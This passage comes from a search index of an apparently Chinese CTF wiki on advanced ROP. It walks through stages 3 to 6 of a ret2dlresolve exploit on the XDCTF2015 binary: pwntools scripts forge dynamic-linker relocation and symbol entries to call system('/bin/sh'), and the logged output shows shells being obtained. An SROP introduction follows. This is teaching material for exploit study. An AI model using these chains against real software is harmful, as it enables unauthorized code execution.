Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )  [ + ]  Starting  local  process  ./main : pid  126063  [ * ]  Loaded cached gadgets  for   ./main  [ * ]  Switching to interactive mode\n/bin/sh [ * ]  Got EOF  while  reading in interactive", 
            "title": "stage 3"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#stage-4", 
            "text": "stage3\u4e2d\uff0c\u6211\u4eec\u63a7\u5236\u4e86\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u4f46\u662f\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u5185\u5bb9\u4e0ewrite\u539f\u6765\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u4e00\u81f4\uff0c\u8fd9\u6b21\uff0c\u6211\u4eec\u5c06\u6784\u9020\u5c5e\u4e8e\u6211\u4eec\u81ea\u5df1\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u5e76\u4e14\u4f2a\u9020\u8be5\u8868\u9879\u5bf9\u5e94\u7684\u7b26\u53f7\u3002\u9996\u5148\uff0c\u6211\u4eec\u6839\u636ewrite\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u7684r_info=0x607\u53ef\u4ee5\u77e5\u9053\uff0cwrite\u5bf9\u5e94\u7684\u7b26\u53f7\u5728\u7b26\u53f7\u8868\u7684\u4e0b\u6807\u4e3a0x607 8=0x6\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u77e5\u9053write\u5bf9\u5e94\u7684\u7b26\u53f7\u5730\u5740\u4e3a0x8048238\u3002  \u279c  ret2dlresolve git: ( master )  \u2717 objdump -s -EL -j  .dynsym main\n\nmain\uff1a     \u6587\u4ef6\u683c\u5f0f elf32-i386\n\nContents of section .dynsym:\n 80481d8  00000000   00000000   00000000   00000000   ................\n 80481e8  33000000   00000000   00000000   12000000    3 ...............\n 80481f8  27000000   00000000   00000000   12000000    ...............\n  8048208   52000000   00000000   00000000   20000000   R........... ...\n  8048218   20000000   00000000   00000000   12000000    ...............\n  8048228  3a000000  00000000   00000000   12000000   :...............\n  8048238  4c000000  00000000   00000000   12000000   L...............\n  8048248  2c000000 44a00408  04000000  11001a00  ,...D...........\n  8048258  0b000000 3c860408  04000000   11001000   .... ...........\n  8048268  1a000000 40a00408  04000000  11001a00  ....@...........  \u8fd9\u91cc\u7ed9\u51fa\u7684\u5176\u5b9e\u662f\u5c0f\u7aef\u6a21\u5f0f\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u624b\u5de5\u8f6c\u6362\u3002\u6b64\u5916\uff0c\u6bcf\u4e2a\u7b26\u53f7\u5360\u7528\u7684\u5927\u5c0f\u4e3a16\u4e2a\u5b57\u8282\u3002  from   pwn   import   *  elf   =   ELF ( main )  r   =   process ( ./main )  rop   =   ROP ( ./main )  offset   =   112  bss_addr   =   elf . bss ()  r . recvuntil ( Welcome to XDCTF2015~! \\n )  ## stack privot to bss segment  ## new stack size is 0x800  stack_size   =   0x800  base_stage   =   bss_addr   +   stack_size  ### padding  rop . raw ( a   *   offset )  ### read 100 byte to base_stage  rop . read ( 0 ,   base_stage ,   100 )  ### stack privot, set esp = base_stage  rop . migrate ( base_stage )  r . sendline ( rop . chain ())  ## write sh= /bin/sh  rop   =   ROP ( ./main )  sh   =   /bin/sh  plt0   =   elf . get_section_by_name ( .plt ) . header . sh_addr  rel_plt   =   elf . get_section_by_name ( .rel.plt ) . header . sh_addr  dynsym   =   elf . get_section_by_name ( .dynsym ) . header . sh_addr  dynstr   =   elf . get_section_by_name ( .dynstr ) . header . sh_addr  ### making fake write symbol  fake_sym_addr   =   base_stage   +   32  align   =   0x10   -   (( fake_sym_addr   -   dynsym )     0xf \n                 )    # since the size of item(Elf32_Symbol) of dynsym is 0x10  fake_sym_addr   =   fake_sym_addr   +   align  index_dynsym   =   ( \n     fake_sym_addr   -   dynsym )   /   0x10    # calculate the dynsym index of write  fake_write_sym   =   flat ([ 0x4c ,   0 ,   0 ,   0x12 ])  ### making fake write relocation  ## making base_stage+24 ---  fake reloc  index_offset   =   base_stage   +   24   -   rel_plt  write_got   =   elf . got [ write ]  r_info   =   ( index_dynsym     8 )   |   0x7  fake_write_reloc   =   flat ([ write_got ,   r_info ])  rop . raw ( plt0 )  rop . raw ( index_offset )  ## fake ret addr of write  rop . raw ( bbbb )  rop . raw ( 1 )  rop . raw ( base_stage   +   80 )  rop . raw ( len ( sh ))  rop . raw ( fake_write_reloc )    # fake write reloc  rop . raw ( a   *   align )    # padding  rop . raw ( fake_write_sym )    # fake write symbol  rop . raw ( a   *   ( 80   -   len ( rop . chain ())))  rop . raw ( sh )  rop . raw ( a   *   ( 100   -   len ( rop . chain ())))  r . sendline ( rop . chain ())  r . interactive ()   \u5177\u4f53\u6548\u679c\u5982\u4e0b  \u279c  ret2dlresolve git: ( master )  \u2717 python stage4.py [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )  [ + ]  Starting  local  process  ./main : pid  128795  [ * ]  Loaded cached gadgets  for   ./main  [ * ]  Switching to interactive mode\n/bin/sh [ * ]  Got EOF  while  reading in interactive", 
            "title": "stage 4"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#stage-5", 
            "text": "\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u5c06\u5728\u9636\u6bb54\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u8fdb\u4e00\u6b65\u4f7f\u5f97write\u7b26\u53f7\u7684st_name\u6307\u5411\u6211\u4eec\u81ea\u5df1\u6784\u9020\u7684\u5b57\u7b26\u4e32\u3002  from   pwn   import   *  elf   =   ELF ( main )  r   =   process ( ./main )  rop   =   ROP ( ./main )  offset   =   112  bss_addr   =   elf . bss ()  r . recvuntil ( Welcome to XDCTF2015~! \\n )  ## stack privot to bss segment  ## new stack size is 0x800  stack_size   =   0x800  base_stage   =   bss_addr   +   stack_size  ### padding  rop . raw ( a   *   offset )  ### read 100 byte to base_stage  rop . read ( 0 ,   base_stage ,   100 )  ### stack privot, set esp = base_stage  rop . migrate ( base_stage )  r . sendline ( rop . chain ())  ## write sh= /bin/sh  rop   =   ROP ( ./main )  sh   =   /bin/sh  plt0   =   elf . get_section_by_name ( .plt ) . header . sh_addr  rel_plt   =   elf . get_section_by_name ( .rel.plt ) . header . sh_addr  dynsym   =   elf . get_section_by_name ( .dynsym ) . header . sh_addr  dynstr   =   elf . get_section_by_name ( .dynstr ) . header . sh_addr  ### making fake write symbol  fake_sym_addr   =   base_stage   +   32  align   =   0x10   -   (( fake_sym_addr   -   dynsym )     0xf \n                 )    # since the size of item(Elf32_Symbol) of dynsym is 0x10  fake_sym_addr   =   fake_sym_addr   +   align  index_dynsym   =   ( \n     fake_sym_addr   -   dynsym )   /   0x10    # calculate the dynsym index of write  ## plus 10 since the size of Elf32_Sym is 16.  st_name   =   fake_sym_addr   +   0x10   -   dynstr  fake_write_sym   =   flat ([ st_name ,   0 ,   0 ,   0x12 ])  ### making fake write relocation  ## making base_stage+24 ---  fake reloc  index_offset   =   base_stage   +   24   -   rel_plt  write_got   =   elf . got [ write ]  r_info   =   ( index_dynsym     8 )   |   0x7  fake_write_reloc   =   flat ([ write_got ,   r_info ])  rop . raw ( plt0 )  rop . raw ( index_offset )  ## fake ret addr of write  rop . raw ( bbbb )  rop . raw ( 1 )  rop . raw ( base_stage   +   80 )  rop . raw ( len ( sh ))  rop . raw ( fake_write_reloc )    # fake write reloc  rop . raw ( a   *   align )    # padding  rop . raw ( fake_write_sym )    # fake write symbol  rop . raw ( write \\x00 )    # there must be a \\x00 to mark the end of string  rop . raw ( a   *   ( 80   -   len ( rop . chain ())))  rop . raw ( sh )  rop . raw ( a   *   ( 100   -   len ( rop . chain ())))  r . sendline ( rop . chain ())  r . interactive ()   \u6548\u679c\u5982\u4e0b  \u279c  ret2dlresolve git: ( master )  \u2717 python stage5.py       [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )  [ + ]  Starting  local  process  ./main : pid  129249  [ * ]  Loaded cached gadgets  for   ./main  [ * ]  Switching to interactive mode\n/bin/sh [ * ]  Got EOF  while  reading in interactive", 
            "title": "stage 5"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#stage-6", 
            "text": "\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5c06\u539f\u5148\u7684write\u5b57\u7b26\u4e32\u4fee\u6539\u4e3asystem\u5b57\u7b26\u4e32\uff0c\u540c\u65f6\u4fee\u6539write\u7684\u53c2\u6570\u4e3asystem\u7684\u53c2\u6570\u5373\u53ef\u83b7\u53d6shell\u3002\u8fd9\u662f\u56e0\u4e3a\uff0cdl_resolve\u6700\u7ec8\u4f9d\u8d56\u7684\u662f\u6211\u4eec\u6240\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\uff0c\u5373\u4f7f\u6211\u4eec\u7ed9\u4e86\u4e00\u4e2a\u5047\u7684\u5b57\u7b26\u4e32\u5b83\u4ecd\u7136\u4f1a\u53bb\u89e3\u6790\u5e76\u6267\u884c\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b  from   pwn   import   *  elf   =   ELF ( main )  r   =   process ( ./main )  rop   =   ROP ( ./main )  offset   =   112  bss_addr   =   elf . bss ()  r . recvuntil ( Welcome to XDCTF2015~! \\n )  ## stack privot to bss segment  ## new stack size is 0x800  stack_size   =   0x800  base_stage   =   bss_addr   +   stack_size  ### padding  rop . raw ( a   *   offset )  ### read 100 byte to base_stage  rop . read ( 0 ,   base_stage ,   100 )  ### stack privot, set esp = base_stage  rop . migrate ( base_stage )  r . sendline ( rop . chain ())  ## write sh= /bin/sh  rop   =   ROP ( ./main )  sh   =   /bin/sh  plt0   =   elf . get_section_by_name ( .plt ) . header . sh_addr  rel_plt   =   elf . get_section_by_name ( .rel.plt ) . header . sh_addr  dynsym   =   elf . get_section_by_name ( .dynsym ) . header . sh_addr  dynstr   =   elf . get_section_by_name ( .dynstr ) . header . sh_addr  ### making fake write symbol  fake_sym_addr   =   base_stage   +   32  align   =   0x10   -   (( fake_sym_addr   -   dynsym )     0xf \n                 )    # since the size of item(Elf32_Symbol) of dynsym is 0x10  fake_sym_addr   =   fake_sym_addr   +   align  index_dynsym   =   ( \n     fake_sym_addr   -   dynsym )   /   0x10    # calculate the dynsym index of write  ## plus 10 since the size of Elf32_Sym is 16.  st_name   =   fake_sym_addr   +   0x10   -   dynstr  fake_write_sym   =   flat ([ st_name ,   0 ,   0 ,   0x12 ])  ### making fake write relocation  ## making base_stage+24 ---  fake reloc  index_offset   =   base_stage   +   24   -   rel_plt  write_got   =   elf . got [ write ]  r_info   =   ( index_dynsym     8 )   |   0x7  fake_write_reloc   =   flat ([ write_got ,   r_info ])  rop . raw ( plt0 )  rop . raw ( index_offset )  ## fake ret addr of write  rop . raw ( bbbb )  rop . raw ( base_stage   +   82 )  rop . raw ( bbbb )  rop . raw ( bbbb )  rop . raw ( fake_write_reloc )    # fake write reloc  rop . raw ( a   *   align )    # padding  rop . raw ( fake_write_sym )    # fake write symbol  rop . raw ( system \\x00 )    # there must be a \\x00 to mark the end of string  rop . raw ( a   *   ( 80   -   len ( rop . chain ())))  print   rop . dump ()  print   len ( rop . chain ())  rop . raw ( sh   +   \\x00 )  rop . raw ( a   *   ( 100   -   len ( rop . chain ())))  r . sendline ( rop . chain ())  r . interactive ()   \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6211'/bin/sh'\u7684\u504f\u79fb\u6211\u4fee\u6539\u4e3a\u4e8682\uff0c\u8fd9\u662f\u56e0\u4e3apwntools\u4e2d\u5b83\u4f1a\u81ea\u52a8\u5e2e\u4f60\u5bf9\u9f50\u5b57\u7b26\u4e32\u3002\u3002\u3002\u4e0b\u9762\u8fd9\u4e00\u884c\u8bf4\u660e\u4e86\u95ee\u9898\u3002  0x0050:            aara   \u6548\u679c\u5982\u4e0b  \u279c  ret2dlresolve git: ( master )  \u2717 python stage6.py [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )  [ + ]  Starting  local  process  ./main : pid  130415  [ * ]  Loaded cached gadgets  for   ./main \n0x0000:        0x8048380\n0x0004:           0x2528\n0x0008:            bbbb   bbbb \n0x000c:        0x804a892\n0x0010:            bbbb   bbbb \n0x0014:            bbbb   bbbb \n0x0018:  \\x1c\\xa0\\x04\\x08   \\x1c\\xa0\\x04\\x08\\x07i\\x02\\x00 \n0x001c:   \\x07i\\x02\\x00 \n0x0020:            aaaa   aaaaaaaa \n0x0024:            aaaa \n0x0028:   \\x00 \\x00\\x00   \\x00 \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x12\\x00\\x00\\x00 \n0x002c:  \\x00\\x00\\x00\\x00 \n0x0030:  \\x00\\x00\\x00\\x00 \n0x0034:  \\x12\\x00\\x00\\x00 \n0x0038:            syst   system\\x00 \n0x003c:         em\\x00o \n0x0040:              aa \n0x0044:            aaaa   aaaaaaaaaaaaaa \n0x0048:            aaaa \n0x004c:            aaaa \n0x0050:            aara  82  [ * ]  Switching to interactive mode\n/bin/sh:  1 : xa: not found\n$ ls\ncore  main.c     stage2.py  stage4.py  stage6.py\nmain  stage1.py  stage3.py  stage5.py", 
            "title": "stage 6"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_5", 
            "text": "\u6839\u636e\u4e0a\u9762\u7684\u4ecb\u7ecd\uff0c\u6211\u4eec\u5e94\u8be5\u5f88\u5bb9\u6613\u53ef\u4ee5\u7406\u89e3\u8fd9\u4e2a\u653b\u51fb\u4e86\u3002\u4e0b\u9762\u6211\u4eec\u76f4\u63a5\u4f7f\u7528roputil\u6765\u8fdb\u884c\u653b\u51fb\u3002\u4ee3\u7801\u5982\u4e0b  from   roputils   import   *  from   pwn   import   process  from   pwn   import   gdb  from   pwn   import   context  r   =   process ( ./main )  context . log_level   =   debug  r . recv ()  rop   =   ROP ( ./main )  offset   =   112  bss_base   =   rop . section ( .bss )  buf   =   rop . fill ( offset )  buf   +=   rop . call ( read ,   0 ,   bss_base ,   100 )  ## used to call dl_Resolve()  buf   +=   rop . dl_resolve_call ( bss_base   +   20 ,   bss_base )  r . send ( buf )  buf   =   rop . string ( /bin/sh )  buf   +=   rop . fill ( 20 ,   buf )  ## used to make faking data, such relocation, Symbol, Str  buf   +=   rop . dl_resolve_data ( bss_base   +   20 ,   system )  buf   +=   rop . fill ( 100 ,   buf )  r . send ( buf )  r . interactive ()   \u5173\u4e8edl_resolve_call\u4e0edl_resolve_data\u7684\u5177\u4f53\u7ec6\u8282\u8bf7\u53c2\u8003roputils.py\u7684\u6e90\u7801\uff0c\u6bd4\u8f83\u5bb9\u6613\u7406\u89e3\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cdl_resolve\u6267\u884c\u5b8c\u4e4b\u540e\u4e5f\u662f\u9700\u8981\u6709\u5bf9\u5e94\u7684\u8fd4\u56de\u5730\u5740\u7684\u3002  \u6548\u679c\u5982\u4e0b  \u279c  ret2dlresolve git: ( master )  \u2717 python roptool.py                        [ + ]  Starting  local  process  ./main : pid  6114  [ DEBUG ]  Received 0x17 bytes:\n     Welcome to XDCTF2015~!\\n  [ DEBUG ]  Sent 0x94 bytes:\n     00000000    46  4c  68   78    52   36   67  6e   65   47   53   58    71   77   51   49   \u2502FLhx\u2502R6gn\u2502eGSX\u2502qwQI\u2502\n     00000010    32   43  6c  49    77   76   51   33    47   49  4a  59    50   74  6c  38   \u25022ClI\u2502wvQ3\u2502GIJY\u2502Ptl8\u2502\n     00000020    57   54   68  4a   63   48   39   62    46   55   52   58    50   73   38   64   \u2502WThJ\u2502cH9b\u2502FURX\u2502Ps8d\u2502\n     00000030    72  4c  38   63    50   79   37   73    55   45  7a  32   6f  59  5a  42   \u2502rL8c\u2502Py7s\u2502UEz2\u2502oYZB\u2502\n     00000040    76   59   32   43    74   75   77  6f   70   56   61   44   6a  73   35  6b  \u2502vY2C\u2502tuwo\u2502pVaD\u2502js5k\u2502\n     00000050    41   77   78   77    49   72  7a  49    70  4d  31   67    52  6f  44  6f  \u2502Awxw\u2502IrzI\u2502pM1g\u2502RoDo\u2502\n     00000060    43   44   43  6e   45   31   50   48    53   73   64   30   6d  54  7a 5a  \u2502CDCn\u2502E1PH\u2502Ssd0\u2502mTzZ\u2502\n     00000070   a0  83   04   08    19   86   04   08    00   00   00   00    40  a0  04   08   \u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502@\u00b7\u00b7\u00b7\u2502\n     00000080    64   00   00   00    80   83   04   08    28  1d  00   00    79   83   04   08   \u2502d\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502 ( \u00b7\u00b7\u00b7\u2502y\u00b7\u00b7\u00b7\u2502\n     00000090    40  a0  04   08                                          \u2502@\u00b7\u00b7\u00b7\u2502\u2502\n     00000094  [ DEBUG ]  Sent 0x64 bytes:\n     00000000   2f  62   69  6e  2f  73   68   00    73   52   46   66    57   43   59   52   \u2502/bin\u2502/sh\u00b7\u2502sRFf\u2502WCYR\u2502\n     00000010    66  4c  35   52    78   49  4c  53    54  a0  04   08    07  e9  01   00   \u2502fL5R\u2502xILS\u2502T\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\n     00000020   6e 6b  45   32    52   76   73  6c   00  1e  00   00    00   00   00   00   \u2502nkE2\u2502Rvsl\u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502\n     00000030    00   00   00   00    12   00   00   00    73   79   73   74    65  6d  00   74   \u2502\u00b7\u00b7\u00b7\u00b7\u2502\u00b7\u00b7\u00b7\u00b7\u2502syst\u2502em\u00b7t\u2502\n     00000040   5a 4f 4e 6c  6c  73  4b 5a   76   53   48  6e   38   37   49   47   \u2502ZONl\u2502lsKZ\u2502vSHn\u250287IG\u2502\n     00000050    69   49   52  6c   50   44   38   67    45   77   75  6c   72   47  6f  67   \u2502iIRl\u2502PD8g\u2502Ewul\u2502rGog\u2502\n     00000060    55   41   52  4f                                         \u2502UARO\u2502\u2502\n     00000064  [ * ]  Switching to interactive mode\n$ ls [ DEBUG ]  Sent 0x3 bytes:\n     ls\\n  [ DEBUG ]  Received 0x8d bytes:\n     core\\t     main    roptool.py   roputils.pyc\\tstage2.py  stage4.py  stage6.py\\n \n     __init__.py  main.c  roputils.py  stage1.py\\tstage3.py  stage5.py\\n \ncore         main    roptool.py   roputils.pyc    stage2.py  stage4.py  stage6.py\n__init__.py  main.c  roputils.py  stage1.py    stage3.py  stage5.py", 
            "title": "\u5de5\u5177\u653b\u51fb"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_6", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#srop", 
            "text": "", 
            "title": "SROP"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_7", 
            "text": "SROP(Sigreturn Oriented Programming)\u4e8e2014\u5e74\u88abVrije Universiteit Amsterdam\u7684Erik Bosman\u63d0\u51fa\uff0c\u5176\u76f8\u5173\u7814\u7a76 Framing Signals \u2014 A Return to Portable Shellcode \u53d1\u8868\u5728\u5b89\u5168\u9876\u7ea7\u4f1a\u8bae Oakland 2014 \u4e0a\uff0c\u88ab\u8bc4\u9009\u4e3a\u5f53\u5e74\u7684 Best Student Papers \u3002\u5176\u4e2d\u76f8\u5173\u7684paper\u4ee5\u53caslides\u7684\u94fe\u63a5\u5982\u4e0b\uff1a  paper  slides  \u5176\u4e2d\uff0c sigreturn \u662f\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u5728\u7c7bunix\u7cfb\u7edf\u53d1\u751fsignal\u7684\u65f6\u5019\u4f1a\u88ab\u95f4\u63a5\u5730\u8c03\u7528\u3002", 
            "title": "\u57fa\u672c\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#signal", 
            "text": "signal\u673a\u5236\u662f\u7c7bunix\u7cfb\u7edf\u4e2d\u8fdb\u7a0b\u4e4b\u95f4\u76f8\u4e92\u4f20\u9012\u4fe1\u606f\u7684\u4e00\u79cd\u65b9\u6cd5\u3002\u4e00\u822c\uff0c\u6211\u4eec\u4e5f\u79f0\u5176\u4e3a\u8f6f\u4e2d\u65ad\u4fe1\u53f7\uff0c\u6216\u8005\u8f6f\u4e2d\u65ad\u3002\u6bd4\u5982\u8bf4\uff0c\u8fdb\u7a0b\u4e4b\u95f4\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528kill\u6765\u53d1\u9001\u8f6f\u4e2d\u65ad\u4fe1\u53f7\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4fe1\u53f7\u673a\u5236\u5e38\u89c1\u7684\u6b65\u9aa4\u5982\u4e0b\u56fe\u6240\u793a\uff1a     \u5185\u6838\u5411\u67d0\u4e2a\u8fdb\u7a0b\u53d1\u9001signal\u673a\u5236\uff0c\u8be5\u8fdb\u7a0b\u4f1a\u88ab\u6682\u65f6\u6302\u8d77\uff0c\u8fdb\u5165\u5185\u6838\u6001\u3002    \u5185\u6838\u4f1a\u4e3a\u8be5\u8fdb\u7a0b\u4fdd\u5b58\u76f8\u5e94\u7684\u4e0a\u4e0b\u6587\uff0c \u4e3b\u8981\u662f\u5c06\u6240\u6709\u5bc4\u5b58\u5668\u538b\u5165\u6808\u4e2d\uff0c\u4ee5\u53ca\u538b\u5165signal\u4fe1\u606f\uff0c\u4ee5\u53ca\u6307\u5411sigreturn\u7684\u7cfb\u7edf\u8c03\u7528\u5730\u5740 \u3002\u6b64\u65f6\u6808\u7684\u7ed3\u6784\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u79f0ucontext\u4ee5\u53casiginfo\u8fd9\u4e00\u6bb5\u4e3aSignal Frame\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e00\u90e8\u5206\u662f\u5728\u7528\u6237\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u7684\u3002 \u4e4b\u540e\u4f1a\u8df3\u8f6c\u5230\u6ce8\u518c\u8fc7\u7684signal handler\u4e2d\u5904\u7406\u76f8\u5e94\u7684signal\u3002\u56e0\u6b64\uff0c\u5f53signal handler\u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u5c31\u4f1a\u6267\u884csigreturn\u4ee3\u7801\u3002   \u5bf9\u4e8esignal Frame\u6765\u8bf4\uff0c\u4e0d\u540c\u4f1a\u56e0\u4e3a\u67b6\u6784\u7684\u4e0d\u540c\u800c\u56e0\u6b64\u6709\u6240\u533a\u522b\uff0c\u8fd9\u91cc\u7ed9\u51fa\u5206\u522b\u7ed9\u51fax86\u4ee5\u53cax64\u7684sigcontext   x86   struct   sigcontext  { \n   unsigned   short   gs ,   __gsh ; \n   unsigned   short   fs ,   __fsh ; \n   unsigned   short   es ,   __esh ; \n   unsigned   short   ds ,   __dsh ; \n   unsigned   long   edi ; \n   unsigned   long   esi ; \n   unsigned   long   ebp ; \n   unsigned   long   esp ; \n   unsigned   long   ebx ; \n   unsigned   long   edx ; \n   unsigned   long   ecx ; \n   unsigned   long   eax ; \n   unsigned   long   trapno ; \n   unsigned   long   err ; \n   unsigned   long   eip ; \n   unsigned   short   cs ,   __csh ; \n   unsigned   long   eflags ; \n   unsigned   long   esp_at_signal ; \n   unsigned   short   ss ,   __ssh ; \n   struct   _fpstate   *   fpstate ; \n   unsigned   long   oldmask ; \n   unsigned   long   cr2 ;  };    x64   struct   _fpstate  { \n   /* FPU environment matching the 64-bit FXSAVE layout.  */ \n   __uint16_t          cwd ; \n   __uint16_t          swd ; \n   __uint16_t          ftw ; \n   __uint16_t          fop ; \n   __uint64_t          rip ; \n   __uint64_t          rdp ; \n   __uint32_t          mxcsr ; \n   __uint32_t          mxcr_mask ; \n   struct   _fpxreg      _st [ 8 ]; \n   struct   _xmmreg      _xmm [ 16 ]; \n   __uint32_t          padding [ 24 ];  };  struct   sigcontext  { \n   __uint64_t   r8 ; \n   __uint64_t   r9 ; \n   __uint64_t   r10 ; \n   __uint64_t   r11 ; \n   __uint64_t   r12 ; \n   __uint64_t   r13 ; \n   __uint64_t   r14 ; \n   __uint64_t   r15 ; \n   __uint64_t   rdi ; \n   __uint64_t   rsi ; \n   __uint64_t   rbp ; \n   __uint64_t   rbx ; \n   __uint64_t   rdx ; \n   __uint64_t   rax ; \n   __uint64_t   rcx ; \n   __uint64_t   rsp ; \n   __uint64_t   rip ; \n   __uint64_t   eflags ; \n   unsigned   short   cs ; \n   unsigned   short   gs ; \n   unsigned   short   fs ; \n   unsigned   short   __pad0 ; \n   __uint64_t   err ; \n   __uint64_t   trapno ; \n   __uint64_t   oldmask ; \n   __uint64_t   cr2 ; \n   __extension__   union \n     { \n       struct   _fpstate   *   fpstate ; \n       __uint64_t   __fpstate_word ; \n     }; \n   __uint64_t   __reserved1   [ 8 ];  };     signal handler\u8fd4\u56de\u540e\uff0c\u5185\u6838\u4e3a\u6267\u884csigreturn\u7cfb\u7edf\u8c03\u7528\uff0c\u4e3a\u8be5\u8fdb\u7a0b\u6062\u590d\u4e4b\u524d\u4fdd\u5b58\u7684\u4e0a\u4e0b\u6587\uff0c\u5176\u4e2d\u5305\u62ec\u5c06\u6240\u6709\u538b\u5165\u7684\u5bc4\u5b58\u5668\uff0c\u91cd\u65b0pop\u56de\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\uff0c\u6700\u540e\u6062\u590d\u8fdb\u7a0b\u7684\u6267\u884c\u3002\u5176\u4e2d\uff0c32\u4f4d\u7684sigreturn\u7684\u8c03\u7528\u53f7\u4e3a77\uff0c64\u4f4d\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u4e3a15\u3002", 
            "title": "signal\u673a\u5236"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_8", 
            "text": "\u4ed4\u7ec6\u56de\u987e\u4e00\u4e0b\u5185\u6838\u5728signal\u4fe1\u53f7\u5904\u7406\u7684\u8fc7\u7a0b\u4e2d\u7684\u5de5\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u5185\u6838\u4e3b\u8981\u505a\u7684\u5de5\u4f5c\u5c31\u662f\u4e3a\u8fdb\u7a0b\u4fdd\u5b58\u4e0a\u4e0b\u6587\uff0c\u5e76\u4e14\u6062\u590d\u4e0a\u4e0b\u6587\u3002\u8fd9\u4e2a\u4e3b\u8981\u7684\u53d8\u52a8\u90fd\u5728Signal Frame\u4e2d\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff1a   Signal Frame\u88ab\u4fdd\u5b58\u5728\u7528\u6237\u7684\u5730\u5740\u7a7a\u95f4\u4e2d\uff0c\u6240\u4ee5\u7528\u6237\u662f\u53ef\u4ee5\u8bfb\u5199\u7684\u3002  \u7531\u4e8e\u5185\u6838\u4e0e\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u65e0\u5173(kernel agnostic about signal handlers)\uff0c\u5b83\u5e76\u4e0d\u4f1a\u53bb\u8bb0\u5f55\u8fd9\u4e2asignal\u5bf9\u5e94\u7684Signal Frame\uff0c\u6240\u4ee5\u5f53\u6267\u884csigreturn\u7cfb\u7edf\u8c03\u7528\u65f6\uff0c\u6b64\u65f6\u7684Signal Frame\u5e76\u4e0d\u4e00\u5b9a\u662f\u4e4b\u524d\u5185\u6838\u4e3a\u7528\u6237\u8fdb\u7a0b\u4fdd\u5b58\u7684Signal Frame\u3002   \u8bf4\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\uff0cSROP\u7684\u57fa\u672c\u5229\u7528\u539f\u7406\u4e5f\u5c31\u51fa\u73b0\u4e86\u3002\u4e0b\u9762\u4e3e\u4e24\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#shell", 
